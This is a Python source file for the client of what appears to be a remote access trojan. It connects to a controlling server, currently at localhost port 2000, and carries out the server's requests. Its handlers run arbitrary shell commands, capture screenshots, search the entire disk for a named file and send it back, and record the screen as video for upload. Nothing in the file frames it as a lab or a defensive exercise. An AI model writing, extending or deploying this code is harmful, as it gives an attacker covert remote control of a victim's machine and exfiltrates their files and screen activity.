import json
import socket
import subprocess
import struct

import numpy as np
import pyautogui
import io
import os
import time
import mss
import cv2



def receive_all(sock, size):
    data = b''
    while len(data) < size:
        part = sock.recv(size - len(data))
        if not part:
            raise ConnectionError("Socket closed before all data received.")
        data += part
    return data


#command
def execute_command(command):
    """Execute a system command and return its output or error."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
        output = result.stdout if result.stdout else ""
        error = result.stderr if result.stderr else ""
        return output + error
    except Exception as e:
        return f"Error: {str(e)}"


def handle_command(request):
    return execute_command(request["command"])

#screenshot
def send_screenshot():
    screenshot = pyautogui.screenshot()
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    return img_bytes.getvalue()

def handle_screenshot(request):
    return send_screenshot()

#file
def send_file_(request):
    file_name = request.get("file_name")
    if not file_name:
        return b"Error: no file_name provided"

    def search_file(start_path):
        for root, dirs, files in os.walk(start_path, topdown=True):
            # Skip folders that raise permission errors
            try:
                dirs[:] = [d for d in dirs]  # force walk to stay in place
            except Exception:
                continue
            if file_name in files:
                full_path = os.path.join(root, file_name)
                print(f"[CLIENT] Found file at: {full_path}")
                try:
                    with open(full_path, "rb") as f:
                        return f.read()
                except Exception as e:
                    return f"Error reading file: {e}".encode("utf-8")
        return None  # not found

    # Try C:\ (for Windows)
    data = search_file("C:\\")
    if data:
        return data

    # Try / (for Linux or alternate roots)
    data = search_file("/")
    if data:
        return data

    # If not found at all
    return b"File not found"


def handle_file_request(request):
    return send_file_(request)

#recorder

def send_record(request):
    duration = request.get("duration")
    temp_file = "temp_record.avi"
    fps = 30
    interval = 1 / fps

    with mss.mss() as sct:
        duration = request.get("duration")
        temp_file = "temp_record.avi"
        target_fps = 30
        frame_interval = 1.0 / target_fps
        frames = []

        with mss.mss() as sct:
            monitor = sct.monitors[1]
            width, height = monitor["width"], monitor["height"]

            start_time = time.time()
            next_frame_time = start_time

            while time.time() - start_time < duration:
                now = time.time()
                if now >= next_frame_time:
                    img = sct.grab(monitor)
                    frame = np.array(img)[:, :, :3]
                    frames.append(frame)
                    next_frame_time += frame_interval
                else:
                    # Sleep a little to avoid busy wait
                    time.sleep(0.001)

        actual_duration = time.time() - start_time
        actual_fps = len(frames) / actual_duration

        print(f"Captured {len(frames)} frames in {actual_duration:.2f} seconds, actual FPS: {actual_fps:.2f}")

        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(temp_file, fourcc, actual_fps, (width, height))
        for frame in frames:
            out.write(frame)
        out.release()

        with open(temp_file, "rb") as f:
            video_bytes = f.read()

        os.remove(temp_file)
        return video_bytes


def handle_recorded(request):
    return send_record(request)


actions = {
    "command": {
        "handler": handle_command
    },
    "screenshot": {
        "handler": handle_screenshot
    },
    "file": {
        "handler": handle_file_request
    },
    "record": {
        "handler": handle_recorded
    }
}


def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_socket.connect(("127.0.0.1", 2000))
        print("Connected to server at 127.0.0.1:2000")

        while True:
            length_bytes = receive_all(client_socket, 4)
            if not length_bytes:
                print("Server closed connection:")
                return

            length = struct.unpack(">I", length_bytes)[0]
            request_bytes = receive_all(client_socket, length)
            request_str = request_bytes.decode('utf-8')

            if not request_str:
                print("No command received or server disconnected.")
                break

            print(f"Received command: {request_str}")
            request = json.loads(request_str)

            action_type = request.get("type")

            if action_type in actions:
                result = actions[action_type]["handler"](request)
            else:
                result = "Unknown action type"

            # Encode string to bytes if needed
            if isinstance(result, str):
                encoded_result = result.encode('utf-8')
            else:
                encoded_result = result

            print(f"Encoded byte length: {len(encoded_result)}")
            size = struct.pack(">I", len(encoded_result))
            client_socket.sendall(size + encoded_result)
            print("Result sent to server.")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()
        print("Client socket closed.")


if __name__ == "__main__":
    main()
